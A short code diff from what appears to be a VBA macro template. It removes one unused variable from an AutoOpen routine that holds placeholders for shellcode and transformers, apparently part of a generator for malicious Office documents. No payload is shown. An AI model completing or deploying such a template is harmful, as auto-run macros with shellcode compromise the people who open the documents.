@@ -24,7 +24,6 @@ Sub AutoOpen()
   Dim counter As Long
   Dim data As Long
   Dim res As LongPtr
-  Dim obfuscated as Variant
 
   {shellcode}
   {transformers}
